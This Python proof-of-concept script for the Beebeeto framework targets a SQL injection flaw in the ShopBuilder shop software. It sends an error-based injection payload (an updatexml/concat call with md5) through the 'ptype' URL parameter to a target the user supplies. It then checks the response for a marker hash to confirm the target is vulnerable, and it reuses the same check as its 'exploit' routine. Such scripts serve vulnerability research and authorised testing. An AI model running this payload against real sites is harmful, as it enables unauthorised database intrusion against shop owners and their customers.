#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0078',
            'name': 'ShopBuilder /?m=product&s=list&ptype SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2015-04-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ShopBuilder',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['ShopBuilder漏洞', '/?m=product&s=list&ptype', 'php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2014-080770',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        payload = '/?m=product&s=list&ptype=0%27%20and%201%3Dupdatexml%281%2Cconcat%280x5c%2Cmd5%28233%29%29%2C1%29%23'
        verify_url = target + payload
        if args['options']['verbose']:
            print 'Request URL: %s' % verify_url
        content = requests.get(verify_url).content
        if 'e165421110ba03099a1c0393373c5b43' in content:
            args['success'] = True
            args['poc_ret']['verify_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())